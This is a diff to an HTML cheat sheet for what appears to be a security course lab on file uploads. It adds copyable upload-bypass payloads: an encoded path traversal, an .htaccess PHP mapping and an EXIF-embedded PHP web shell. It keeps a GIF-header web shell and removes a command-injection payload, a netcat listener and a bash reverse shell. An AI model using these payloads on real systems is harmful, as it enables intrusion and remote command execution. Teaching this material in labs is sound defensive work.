@@ -672,11 +672,11 @@
       </div>
     </section>
 
-    <!-- Category 3e: File Upload, Web Shells & Command Injection -->
+    <!-- Category 3e: File Upload, Web Shells & Filter Bypasses -->
     <section class="cheat-section" id="web-shells">
       <div class="cheat-section__header">
         <span style="font-size:1.25rem;">🐚</span>
-        <h2 class="cheat-section__title">File Upload, Web Shells &amp; Command Injection (Lab 06)</h2>
+        <h2 class="cheat-section__title">File Upload, Web Shells &amp; Filter Bypasses (Lab 06)</h2>
       </div>
       <div class="cheat-table-container">
         <table class="cheat-table">
@@ -708,7 +708,7 @@
                 </div>
               </td>
               <td><strong>Double-encoded null byte</strong></td>
-              <td>Express decodes <span class="flag-pill">%25</span> to <code>%</code> so the allowlist sees <code>.md</code> while <code>cutOffPoisonNullByte()</code> truncates at <code>%00</code></td>
+              <td>HTTP router decodes <span class="flag-pill">%25</span> to <code>%</code> once so the suffix guard sees <code>.md</code> before the file handler truncates at <code>%00</code></td>
               <td><a href="./labs/lab06.html#misconfig-recon" class="badge-lab-ref">Lab 06</a></td>
             </tr>
             <tr>
@@ -747,6 +747,28 @@
             <tr>
               <td>
                 <div class="code-copy-inline">
+                  <code>..%2fexploit.php</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('..%2fexploit.php')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Obfuscated path-traversal upload</strong></td>
+              <td>URL-encodes <span class="flag-pill">/</span> as <code>%2f</code> so literal <code>../</code> stripping misses it, saving one folder up where PHP executes</td>
+              <td><a href="./labs/lab06.html#advanced-upload-bypasses" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>AddType application/x-httpd-php .l33t</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('AddType application/x-httpd-php .l33t')">Copy</button>
+                </div>
+              </td>
+              <td><strong><code>.htaccess</code> execution override</strong></td>
+              <td>Upload inside <span class="flag-pill">.htaccess</span> to bypass a <code>.php</code> blacklist by mapping a custom extension to Apache's PHP engine</td>
+              <td><a href="./labs/lab06.html#advanced-upload-bypasses" class="badge-lab-ref">Lab 06</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
                   <code>GIF89a&lt;?php system($_GET['cmd']); ?&gt;</code>
                   <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('GIF89a&lt;?php system($_GET[\'cmd\']); ?&gt;')">Copy</button>
                 </div>
@@ -758,35 +780,13 @@
             <tr>
               <td>
                 <div class="code-copy-inline">
-                  <code>productId=1&amp;storeId=1|whoami</code>
-                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('productId=1&storeId=1|whoami')">Copy</button>
+                  <code>exiftool -Comment="&lt;?php system($_GET['cmd']); ?&gt;" a.jpg -o polyglot.php</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('exiftool -Comment=&quot;&lt;?php system($_GET[\'cmd\']); ?&gt;&quot; a.jpg -o polyglot.php')">Copy</button>
                 </div>
               </td>
-              <td><strong>OS command injection</strong></td>
-              <td>Pipes output into <code>whoami</code> inside <code>/bin/sh</code> without splitting the form body (use <span class="flag-pill">|</span>, <code>;</code>, or <code>%26</code> instead of raw <code>&amp;</code>)</td>
-              <td><a href="./labs/lab06.html#command-injection" class="badge-lab-ref">Lab 06</a></td>
-            </tr>
-            <tr>
-              <td>
-                <div class="code-copy-inline">
-                  <code>nc -lvnp 4444</code>
-                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('nc -lvnp 4444')">Copy</button>
-                </div>
-              </td>
-              <td><strong>Reverse shell listener</strong></td>
-              <td><span class="flag-pill">-l</span> listen, <span class="flag-pill">-v</span> verbose, <span class="flag-pill">-n</span> no DNS, <span class="flag-pill">-p</span> port. Catches an inbound shell connection</td>
-              <td><a href="./labs/lab06.html#command-injection" class="badge-lab-ref">Lab 06</a></td>
-            </tr>
-            <tr>
-              <td>
-                <div class="code-copy-inline">
-                  <code>bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1</code>
-                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('bash -i >& /dev/tcp/YOUR_IP/4444 0>&1')">Copy</button>
-                </div>
-              </td>
-              <td><strong>Bash reverse shell</strong></td>
-              <td>Target dials out to your listener over TCP so you get an interactive terminal (used live over VPN in Week 8)</td>
-              <td><a href="./labs/lab06.html#command-injection" class="badge-lab-ref">Lab 06</a></td>
+              <td><strong>EXIF comment polyglot</strong></td>
+              <td>Embeds PHP inside a valid JPEG's EXIF <span class="flag-pill">Comment</span> block so full image validators accept it while Apache executes it</td>
+              <td><a href="./labs/lab06.html#magic-bytes-polyglot" class="badge-lab-ref">Lab 06</a></td>
             </tr>
           </tbody>
         </table>
